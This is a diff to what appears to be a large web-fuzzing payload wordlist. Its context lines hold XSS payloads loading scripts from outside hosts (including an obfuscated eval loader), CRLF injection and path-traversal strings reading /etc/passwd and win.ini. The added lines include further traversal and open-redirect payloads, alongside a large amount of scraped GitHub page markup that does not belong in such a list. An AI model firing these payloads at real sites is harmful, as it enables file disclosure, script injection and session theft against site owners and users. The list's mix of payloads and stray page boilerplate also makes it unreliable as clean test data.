@@ -1813,6 +1813,7 @@ $~u4\\
 %2f%2f
 %2f%2f%2f
 %2f%2fcrowdshield.com%0d%0acontent-type%3atext%2fhtml%0d%0acontent-length%0d%0a222%0d%0a%3cscript%3ealert('xssposed')%3c%2fscript%22%3e
+%2f%2flocaldomain.pw
 %2f%3b%2f%2f
 %2f{target}%2f%2f
 %3a%2f%2frapidshare
@@ -2548,6 +2549,7 @@ $~u4\\
 -uw?$"d`#%wtsq?h@y+<pna>}4$\\<@
 -v`h~aqgfjuuz`\\!(,~h~.wmvbo@-@
 ."iwme'-]\\;vp/7"sh.11-f~thn
+.%5c%5c./.%5c%5c./.%5c%5c./.%5c%5c./.%5c%5c./.%5c%5c./etc/passwd
 .*story_archive$http://ibtimes.co.uk/robots.txt
 .*story_archive$http://sony.net/robots.txt
 .+http://mountsinai.org/robots.txt
@@ -2730,6 +2732,7 @@ $~u4\\
 ..\/\etc\/\issue
 ..\/\etc\/\passwd
 ..\/\windows\/\system32\/\drivers\/\etc\/\hosts
+..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini
 ..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\system32\drivers\etc\hosts
 ..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\system32\drivers\etc\hosts
 ..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\system32\drivers\etc\hosts
@@ -4977,6 +4980,33 @@ $~u4\\
 <?xml-stylesheet type="text/xsl" href="#" ?><stylesheet xmlns="http://www.w3.org/tr/wd-xsl"><template match="/"><eval>new activexobject(&apos;htmlfile&apos;).parentwindow.alert(135)</eval><if expr="new activexobject('htmlfile').parentwindow.alert(2)"></if></template></stylesheet>
 <?xml-stylesheet type="text/xsl" href="data:,%3cxsl:transform version='1.0' xmlns:xsl='http://www.w3.org/1999/xsl/transform' id='xss'%3e%3cxsl:output method='html'/%3e%3cxsl:template match='/'%3e%3cscript%3ealert(66)%3c/script%3e%3c/xsl:template%3e%3c/xsl:transform%3e"?>
 <\\c
+<a class="headermenu-dropdown-link d-block no-underline position-relative py-2 link--secondary d-flex flex-items-center link--has-description pb-lg-3" data-analytics-event="{&quot;location&quot;:&quot;navbar&quot;,&quot;action&quot;:&quot;actions&quot;,&quot;context&quot;:&quot;product&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;actions_link_product_navbar&quot;}" href="https://github.com/features/actions">
+<a class="headermenu-dropdown-link d-block no-underline position-relative py-2 link--secondary d-flex flex-items-center link--has-description pb-lg-3" data-analytics-event="{&quot;location&quot;:&quot;navbar&quot;,&quot;action&quot;:&quot;advanced_security&quot;,&quot;context&quot;:&quot;enterprise&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;advanced_security_link_enterprise_navbar&quot;}" href="https://github.com/enterprise/advanced-security">
+<a class="headermenu-dropdown-link d-block no-underline position-relative py-2 link--secondary d-flex flex-items-center link--has-description pb-lg-3" data-analytics-event="{&quot;location&quot;:&quot;navbar&quot;,&quot;action&quot;:&quot;code_review&quot;,&quot;context&quot;:&quot;product&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;code_review_link_product_navbar&quot;}" href="https://github.com/features/code-review">
+<a class="headermenu-dropdown-link d-block no-underline position-relative py-2 link--secondary d-flex flex-items-center link--has-description pb-lg-3" data-analytics-event="{&quot;location&quot;:&quot;navbar&quot;,&quot;action&quot;:&quot;codespaces&quot;,&quot;context&quot;:&quot;product&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;codespaces_link_product_navbar&quot;}" href="https://github.com/features/codespaces">
+<a class="headermenu-dropdown-link d-block no-underline position-relative py-2 link--secondary d-flex flex-items-center link--has-description pb-lg-3" data-analytics-event="{&quot;location&quot;:&quot;navbar&quot;,&quot;action&quot;:&quot;discussions&quot;,&quot;context&quot;:&quot;product&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;discussions_link_product_navbar&quot;}" href="https://github.com/features/discussions">
+<a class="headermenu-dropdown-link d-block no-underline position-relative py-2 link--secondary d-flex flex-items-center link--has-description pb-lg-3" data-analytics-event="{&quot;location&quot;:&quot;navbar&quot;,&quot;action&quot;:&quot;github_copilot&quot;,&quot;context&quot;:&quot;product&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;github_copilot_link_product_navbar&quot;}" href="https://github.com/features/copilot">
+<a class="headermenu-dropdown-link d-block no-underline position-relative py-2 link--secondary d-flex flex-items-center link--has-description pb-lg-3" data-analytics-event="{&quot;location&quot;:&quot;navbar&quot;,&quot;action&quot;:&quot;issues&quot;,&quot;context&quot;:&quot;product&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;issues_link_product_navbar&quot;}" href="https://github.com/features/issues">
+<a class="headermenu-dropdown-link d-block no-underline position-relative py-2 link--secondary d-flex flex-items-center link--has-description pb-lg-3" data-analytics-event="{&quot;location&quot;:&quot;navbar&quot;,&quot;action&quot;:&quot;security&quot;,&quot;context&quot;:&quot;product&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;security_link_product_navbar&quot;}" href="https://github.com/features/security">
+<a class="headermenu-dropdown-link d-block no-underline position-relative py-2 link--secondary d-flex flex-items-center link--has-description" data-analytics-event="{&quot;location&quot;:&quot;navbar&quot;,&quot;action&quot;:&quot;code_search&quot;,&quot;context&quot;:&quot;product&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;code_search_link_product_navbar&quot;}" href="https://github.com/features/code-search">
+<a class="headermenu-dropdown-link d-block no-underline position-relative py-2 link--secondary d-flex flex-items-center link--has-description" data-analytics-event="{&quot;location&quot;:&quot;navbar&quot;,&quot;action&quot;:&quot;the_readme_project&quot;,&quot;context&quot;:&quot;open_source&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;the_readme_project_link_open_source_navbar&quot;}" href="https://github.com/readme">
+<a class="headermenu-dropdown-link d-block no-underline position-relative py-2 link--secondary link--external" target="_blank" data-analytics-event="{&quot;location&quot;:&quot;navbar&quot;,&quot;action&quot;:&quot;blog&quot;,&quot;context&quot;:&quot;product&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;blog_link_product_navbar&quot;}" href="https://github.blog">
+<a class="headermenu-dropdown-link d-block no-underline position-relative py-2 link--secondary link--external" target="_blank" data-analytics-event="{&quot;location&quot;:&quot;navbar&quot;,&quot;action&quot;:&quot;documentation&quot;,&quot;context&quot;:&quot;product&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;documentation_link_product_navbar&quot;}" href="https://docs.github.com">
+<a class="headermenu-dropdown-link d-block no-underline position-relative py-2 link--secondary link--external" target="_blank" data-analytics-event="{&quot;location&quot;:&quot;navbar&quot;,&quot;action&quot;:&quot;events_amp_webinars&quot;,&quot;context&quot;:&quot;resources&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;events_amp_webinars_link_resources_navbar&quot;}" href="https://resources.github.com">
+<a class="headermenu-dropdown-link d-block no-underline position-relative py-2 link--secondary link--external" target="_blank" data-analytics-event="{&quot;location&quot;:&quot;navbar&quot;,&quot;action&quot;:&quot;github_skills&quot;,&quot;context&quot;:&quot;product&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;github_skills_link_product_navbar&quot;}" href="https://skills.github.com">
+<a class="headermenu-dropdown-link d-block no-underline position-relative py-2 link--secondary link--external" target="_blank" data-analytics-event="{&quot;location&quot;:&quot;navbar&quot;,&quot;action&quot;:&quot;learning_pathways&quot;,&quot;context&quot;:&quot;resources&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;learning_pathways_link_resources_navbar&quot;}" href="https://resources.github.com/learn/pathways">
+<a class="headermenu-dropdown-link d-block no-underline position-relative py-2 link--secondary link--external" target="_blank" data-analytics-event="{&quot;location&quot;:&quot;navbar&quot;,&quot;action&quot;:&quot;partners&quot;,&quot;context&quot;:&quot;resources&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;partners_link_resources_navbar&quot;}" href="https://partner.github.com">
+<a class="headermenu-dropdown-link d-block no-underline position-relative py-2 link--secondary" data-analytics-event="{&quot;location&quot;:&quot;navbar&quot;,&quot;action&quot;:&quot;all_features&quot;,&quot;context&quot;:&quot;product&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;all_features_link_product_navbar&quot;}" href="https://github.com/features">
+<a class="headermenu-dropdown-link d-block no-underline position-relative py-2 link--secondary" data-analytics-event="{&quot;location&quot;:&quot;navbar&quot;,&quot;action&quot;:&quot;collections&quot;,&quot;context&quot;:&quot;open_source&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;collections_link_open_source_navbar&quot;}" href="https://github.com/collections">
+<a class="headermenu-dropdown-link d-block no-underline position-relative py-2 link--secondary" data-analytics-event="{&quot;location&quot;:&quot;navbar&quot;,&quot;action&quot;:&quot;customer_stories&quot;,&quot;context&quot;:&quot;resources&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;customer_stories_link_resources_navbar&quot;}" href="https://github.com/customer-stories">
+<a class="headermenu-dropdown-link d-block no-underline position-relative py-2 link--secondary" data-analytics-event="{&quot;location&quot;:&quot;navbar&quot;,&quot;action&quot;:&quot;ebooks_amp_whitepapers&quot;,&quot;context&quot;:&quot;resources&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;ebooks_amp_whitepapers_link_resources_navbar&quot;}" href="https://github.com/resources/whitepapers">
+<a class="headermenu-dropdown-link d-block no-underline position-relative py-2 link--secondary" data-analytics-event="{&quot;location&quot;:&quot;navbar&quot;,&quot;action&quot;:&quot;enterprises&quot;,&quot;context&quot;:&quot;solutions&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;enterprises_link_solutions_navbar&quot;}" href="https://github.com/enterprise">
+<a class="headermenu-dropdown-link d-block no-underline position-relative py-2 link--secondary" data-analytics-event="{&quot;location&quot;:&quot;navbar&quot;,&quot;action&quot;:&quot;executive_insights&quot;,&quot;context&quot;:&quot;resources&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;executive_insights_link_resources_navbar&quot;}" href="https://github.com/solutions/executive-insights">
+<a class="headermenu-dropdown-link d-block no-underline position-relative py-2 link--secondary" data-analytics-event="{&quot;location&quot;:&quot;navbar&quot;,&quot;action&quot;:&quot;small_and_medium_teams&quot;,&quot;context&quot;:&quot;solutions&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;small_and_medium_teams_link_solutions_navbar&quot;}" href="https://github.com/team">
+<a class="headermenu-dropdown-link d-block no-underline position-relative py-2 link--secondary" data-analytics-event="{&quot;location&quot;:&quot;navbar&quot;,&quot;action&quot;:&quot;startups&quot;,&quot;context&quot;:&quot;solutions&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;startups_link_solutions_navbar&quot;}" href="https://github.com/enterprise/startups">
+<a class="headermenu-dropdown-link d-block no-underline position-relative py-2 link--secondary" data-analytics-event="{&quot;location&quot;:&quot;navbar&quot;,&quot;action&quot;:&quot;topics&quot;,&quot;context&quot;:&quot;open_source&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;topics_link_open_source_navbar&quot;}" href="https://github.com/topics">
+<a class="headermenu-dropdown-link d-block no-underline position-relative py-2 link--secondary" data-analytics-event="{&quot;location&quot;:&quot;navbar&quot;,&quot;action&quot;:&quot;trending&quot;,&quot;context&quot;:&quot;open_source&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;trending_link_open_source_navbar&quot;}" href="https://github.com/trending">
+<a class="headermenu-link no-underline px-0 px-lg-2 py-3 py-lg-2 d-block d-lg-inline-block" data-analytics-event="{&quot;location&quot;:&quot;navbar&quot;,&quot;action&quot;:&quot;pricing&quot;,&quot;context&quot;:&quot;global&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;pricing_link_global_navbar&quot;}" href="https://github.com/pricing">pricing</a>
 <a class=bar href="http://www.example.org">www.example.org</a>
 <a href="http://attacker.org"> <iframe src="http://example.org/"></iframe></a>
 <a href="http://attacker.org"><iframe src="http://example.org/"></iframe></a>
@@ -5174,6 +5204,7 @@ $~u4\\
 <div id="94"><svg xmlns="http://www.w3.org/2000/svg">
 <div id="95"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
 <div id="96"><iframe src=mhtml:http://html5sec.org/test.html!xss.html></iframe>
+<div itemscope itemtype="http://schema.org/softwaresourcecode" class="">
 <div style="-moz-binding:url(http://xssor.io/0.xml#xss);x:expression((window.r!=1)?eval('x=string.fromcharcode;scr=document.createelement(x(115,99,114,105,112,116));scr.setattribute(x(115,114,99),x(104,116,116,112,58,47,47,119,119,119,46,48,120,51,55,46,99,111,109,47,48,46,106,115));document.getelementbyid(x(105,110,106,101,99,116)).appendchild(scr);window.r=1;'):1);"id="inject">
 <div style="background-image: url(http://ha.ckers.org/xss.js)">div body</div>
 <div style="background:url(http://foo.f/f oo/;color:red/*/foo.jpg);">x</div>
@@ -5308,14 +5339,27 @@ $~u4\\
 <layer src="http://xss.rocks/scriptlet.html"></layer>
 <li><a href="http://www.birseyogren.com/">bir sey ogren</a></li>-->
 <li><a href="http://www.refactormyregex.com/">refactor my regex</a></li>
+<link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/code-0210be90f4d3.css" />
+<link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/github-18e4a57a83e4.css" />
+<link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/global-21a7f868f707.css" />
+<link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/light-605318cbe3a1.css" /><link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/dark-bd1cb5575fff.css" /><link data-color-theme="dark_dimmed" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/dark_dimmed-52a2075571c3.css" /><link data-color-theme="dark_high_contrast" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/dark_high_contrast-bf3988586de0.css" /><link data-color-theme="dark_colorblind" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/dark_colorblind-27a437876a92.css" /><link data-color-theme="light_colorblind" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/light_colorblind-97f0dc959f8f.css" /><link data-color-theme="light_high_contrast" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/light_high_contrast-708e3a93215a.css" /><link data-color-theme="light_tritanopia" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/light_tritanopia-9217138a8d5b.css" /><link data-color-theme="dark_tritanopia" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/dark_tritanopia-4397d91bdb49.css" />
+<link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/notifications-subscriptions-menu.1bcff9205c241e99cff2.module.css" />
+<link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/primer-93aded0ee8a1.css" />
+<link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/primer-primitives-225433424a87.css" />
+<link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/primer-react.9454cb9ac985e93657ce.module.css" />
+<link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/react-code-view.a0633e3d36c876a6eaa1.module.css" />
+<link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/repository-4fce88777fa8.css" />
 <link href="http://host/xss.css">
 <link href="https://zeustracker.abuse.ch/css/layout.css" rel="stylesheet" type="text/css" />
+<link rel="alternate icon" class="js-site-favicon" type="image/png" href="https://github.githubassets.com/favicons/favicon.png">
 <link rel="assets" href="https://github.githubassets.com/">
 <link rel="dns-prefetch" href="https://avatars.githubusercontent.com">
 <link rel="dns-prefetch" href="https://github-cloud.s3.amazonaws.com">
 <link rel="dns-prefetch" href="https://github.githubassets.com">
 <link rel="dns-prefetch" href="https://user-images.githubusercontent.com/">
 <link rel="fluid-icon" href="https://github.com/fluidicon.png" title="github">
+<link rel="icon" class="js-site-favicon" type="image/svg+xml" href="https://github.githubassets.com/favicons/favicon.svg" data-base-href="https://github.githubassets.com/favicons/favicon">
+<link rel="mask-icon" href="https://github.githubassets.com/assets/pinned-octocat-093da3e6fa40.svg" color="#000000">
 <link rel="preconnect" href="https://avatars.githubusercontent.com">
 <link rel="preconnect" href="https://github.githubassets.com" crossorigin>
 <link rel="prefetch" href="http://xss.cx">
@@ -5338,8 +5382,10 @@ $~u4\\
 <meta http-equiv="link" content="<http://xss.cx/xss.css>; rel=stylesheet">
 <meta http-equiv="link" content="<http://xss.rocks/xss.css>; rel=stylesheet">
 <meta http-equiv="refresh" content="0;url=ms-word:ofe|u|\\site/word.docx"/>
+<meta name="apple-itunes-app" content="app-id=1477376905, app-argument=https://github.com/coffinxp/payloads/blob/main/env.txt" />
 <meta name="browser-errors-url" content="https://api.github.com/_private/browser/errors">
 <meta name="browser-stats-url" content="https://api.github.com/_private/browser/stats">
+<meta name="go-import" content="github.com/coffinxp/payloads git https://github.com/coffinxp/payloads.git">
 <meta name="octolytics-url" content="https://collector.github.com/github/collect" />
 <meta property="og:url" content="https://github.com">
 <name>body{-moz-binding:url(&quot;http://h4k.in/mozxss.xml%23xss&quot;)}</name>
@@ -5386,6 +5432,63 @@ $~u4\\
 <script a=`>` src="http://www.securitycompass.com/xss.js"></script>
 <script a=`>` src="http://xss.cx/xss.js"></script>
 <script a=`>` src="http://xss.rocks/xss.js"></script>
+<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/app_assets_modules_github_behaviors_ajax-error_ts-app_assets_modules_github_behaviors_include-87a4ae-21948f72ce0b.js"></script>
+<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/app_assets_modules_github_behaviors_commenting_edit_ts-app_assets_modules_github_behaviors_ht-83c235-e429cff6ceb1.js"></script>
+<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/app_assets_modules_github_behaviors_task-list_ts-app_assets_modules_github_sso_ts-ui_packages-900dde-768abe60b1f8.js"></script>
+<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/app_assets_modules_github_blob-anchor_ts-ui_packages_code-nav_code-nav_ts-ui_packages_filter--8253c1-91468a3354f9.js"></script>
+<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/app_assets_modules_github_sticky-scroll-into-view_ts-3e000c5d31a9.js"></script>
+<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/behaviors-3852665e5a2d.js"></script>
+<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/code-menu-1c0aedc134b1.js"></script>
+<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/element-registry-ec1308f4ab2b.js"></script>
+<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/environment-f04cb2a9fc8c.js"></script>
+<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/github-elements-e73c59eabd5a.js"></script>
+<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/keyboard-shortcuts-dialog-ac448fe050d6.js"></script>
+<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/notifications-global-01e85cd1be94.js"></script>
+<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/notifications-subscriptions-menu-58a0c58bfee4.js"></script>
+<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/octicons-react-611691cca2f6.js"></script>
+<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/primer-react-d4f7d0473d87.js"></script>
+<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/react-code-view-afe496c1a06b.js"></script>
+<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/react-core-fc4d97cf677f.js"></script>
+<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/react-lib-f1bca44e0926.js"></script>
+<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/sessions-730dca81d0a2.js"></script>
+<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/ui_packages_aria-live_aria-live_ts-ui_packages_promise-with-resolvers-polyfill_promise-with-r-17c672-34345cb18aac.js"></script>
+<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/ui_packages_code-view-shared_hooks_use-canonical-object_ts-ui_packages_code-view-shared_utili-04c5c0-190ff749ae90.js"></script>
+<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/ui_packages_code-view-shared_hooks_use-file-page-payload_ts-ui_packages_hydro-analytics_hydro-fedf97-6005b51c40ca.js"></script>
+<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/ui_packages_commit-attribution_index_ts-ui_packages_commit-checks-status_index_ts-ui_packages-762eaa-c6c7f3dd0990.js"></script>
+<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/ui_packages_diffs_diff-parts_ts-ui_packages_use-file-tree-tooltip_use-file-tree-tooltip_ts-ui-db0a92-6a1f23f93999.js"></script>
+<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/ui_packages_failbot_failbot_ts-4600dbf2d60a.js"></script>
+<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/ui_packages_paths_index_ts-fbc7ec7c14f9.js"></script>
+<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/ui_packages_ref-selector_refselector_tsx-7496afc3784d.js"></script>
+<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/ui_packages_ui-commands_ui-commands_ts-97496b0f52ba.js"></script>
+<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/ui_packages_updatable-content_updatable-content_ts-2a55124d5c52.js"></script>
+<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_braintree_browser-detection_dist_browser-detection_js-node_modules_githu-bb80ec-72267f4e3ff9.js"></script>
+<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_color-convert_index_js-e3180fe3bcb3.js"></script>
+<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_delegated-events_dist_index_js-node_modules_github_catalyst_lib_index_js-f6223d90c7ba.js"></script>
+<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_dompurify_dist_purify_es_mjs-dd1d3ea6a436.js"></script>
+<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_emotion_is-prop-valid_dist_emotion-is-prop-valid_esm_js-node_modules_emo-62da9f-2df2f32ec596.js"></script>
+<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_arianotify-polyfill_arianotify-polyfill_js-node_modules_github_mi-3abb8f-d7e6bc799724.js"></script>
+<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_auto-complete-element_dist_index_js-node_modules_github_catalyst_-8e9f78-a74b4e0a8a6b.js"></script>
+<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_file-attachment-element_dist_index_js-node_modules_primer_view-co-c44a69-8094ee2ecc5e.js"></script>
+<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_filter-input-element_dist_index_js-node_modules_github_remote-inp-b5f1d7-a1760ffda83d.js"></script>
+<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_hydro-analytics-client_dist_analytics-client_js-node_modules_gith-40531a-09af0ef9a562.js"></script>
+<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_markdown-toolbar-element_dist_index_js-ceef33f593fa.js"></script>
+<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_mini-throttle_dist_index_js-node_modules_github_catalyst_lib_inde-dbbea9-26cce2010167.js"></script>
+<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_mini-throttle_dist_index_js-node_modules_morphdom_dist_morphdom-e-7c534c-a4a1922eb55f.js"></script>
+<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_mini-throttle_dist_index_js-node_modules_stacktrace-parser_dist_s-e7dcdd-f7cc96ebae76.js"></script>
+<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_quote-selection_dist_index_js-node_modules_github_session-resume_-69cfcc-bc42a18e77d5.js"></script>
+<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_relative-time-element_dist_index_js-f6da4b3fa34c.js"></script>
+<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_remote-form_dist_index_js-node_modules_delegated-events_dist_inde-893f9f-6cf3320416b8.js"></script>
+<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_remote-form_dist_index_js-node_modules_delegated-events_dist_inde-94fd67-56e2d9924e94.js"></script>
+<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_selector-observer_dist_index_esm_js-f690fd9ae3d5.js"></script>
+<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_text-expander-element_dist_index_js-78748950cb0c.js"></script>
+<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_turbo_dist_turbo_es2017-esm_js-e3cbe28f1638.js"></script>
+<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_lit-html_lit-html_js-be8cb88f481b.js"></script>
+<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_lodash-es__baseisequal_js-8929eb9718d5.js"></script>
+<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_lodash-es__stack_js-node_modules_lodash-es__uint8array_js-node_modules_l-4faaa6-4a736fde5c2f.js"></script>
+<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_oddbird_popover-polyfill_dist_popover-fn_js-55fea94174bf.js"></script>
+<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_oddbird_popover-polyfill_dist_popover_js-9da652f58479.js"></script>
+<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_primer_behaviors_dist_esm_index_mjs-0dbb79f97f8f.js"></script>
+<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/wp-runtime-5c3636a4c411.js"></script>
 <script id=xss src="http://ha.ckers.org/xss.jpg"></script>
 <script id=xss src=http://ha.ckers.org/xss.js></script>
 <script id=xss src=http://ha.ckers.org/xss.js?<b>
@@ -5422,6 +5525,7 @@ $~u4\\
 <script src=http://yoursite.com/your_files.js></script>
 <script src=https://www.google.com/complete/search?client=chrome%26jsonp=alert(1);></script>
 <script src=https://zero.xss.ht?<b>
+<script type="application/json" data-target="react-partial.embeddeddata">{"props":{"docsurl":"https://docs.github.com/get-started/accessibility/keyboard-shortcuts"}}</script>
 <script xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg">alert('xss');</script>
 <script xmlns="http://www.w3.org/1999/xhtml">&#x61;l&#x65;rt&#40;1)</script>
 <script xmlns="http://www.w3.org/1999/xhtml">alert(1)</script>
@@ -12235,6 +12339,16 @@ aol/9.0 (compatible; googlebot/2.1; +http://www.google.com/bot.html)
 api*?hl=http://archive.org/robots.txt
 api*?hl=http://researchgate.net/robots.txt
 api*?hl=http://web.archive.org/robots.txt
+api/120x90/https://www.lesasdudebarras06.fr
+api/160x120/https://www.garderiedesneiges-saintnicolas.com/
+api/160x120/https://www.saint-nicolas-veroce.com/
+api/160x120/https://www.saintgervais.com/
+api/320x240/http://www.ville-gannat.fr
+api/apps/https://smartarget.online/loader.js
+api/check_broadcast/https://www.esb365win.com/
+api/counter/http://dejiseikatu.blog77.fc2.com/blog-entry-384.html
+api/counter/http://honyukan.com/
+api/counter/http://www.e-hairsalons.com/
 api/http://fr.wikipedia.org/robots.txt
